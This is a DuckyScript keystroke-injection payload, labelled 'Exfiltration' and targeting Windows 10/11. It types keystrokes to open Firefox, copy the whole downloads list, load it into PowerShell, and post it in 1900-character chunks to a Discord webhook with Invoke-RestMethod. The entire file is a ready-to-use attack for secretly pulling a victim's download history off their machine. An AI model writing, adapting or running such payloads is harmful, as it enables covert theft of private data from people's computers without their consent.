* ###########################################################
* #                                                         |
* # Title        : Exports all the links of the downloads   |
* # Author       : Aleff                                    |
* # Version      : 1.0                                      |
* # Category     : Exfiltration                             |
* # Target       : Windows 10/11                            |
* #                                                         |
* ###########################################################


* Requirements:
*     - Firefox installed


* Open Firefox
GUI
DELAY 1000
STRING Firefox
DELAY 500
ENTER
DELAY 2000

* Goto downloads and copy all
CTRL j
DELAY 500
CTRL a
DELAY 500
CTRL c
DELAY 500

* Open a PowerShell and put all the links into $DOWNLOADS var
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1000
STRING $DOWNLOADS="
CTRL v
DELAY 500
ENTER

* It depends on the number of links
DELAY 10000

STRING "
ENTER

* Exfiltration using Discord Webhook
* You must define your Discord webhook if you want to use this method for the exfiltration
STRING $WebhookUrl = "DISCORD_WEBHOOK"
ENTER

STRING $Payload = @{content = $DOWNLOADS} | ConvertTo-Json
ENTER

* This algorithm is used to avoid the size limit imposed by Invoke-RestMethod on the payload length
STRING $len = $DOWNLOADS.Length
ENTER
STRING $MAX_LEN = 1900
ENTER
STRING $ITERATIONS = [math]::Ceiling($len / $MAX_LEN)
ENTER
STRING for ($i = 0; $i -lt $ITERATIONS; $i++) {
ENTER
STRING $init = $i * $MAX_LEN
ENTER
STRING $end = [math]::Min(($i + 1) * $MAX_LEN, $len)
        
ENTER
STRING $sub = $DOWNLOADS.Substring($init, $end - $init)
ENTER
STRING $Payload = @{content = $sub} | ConvertTo-Json

ENTER
STRING Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Payload -ContentType 'application/json'
ENTER
STRING }; exit;
ENTER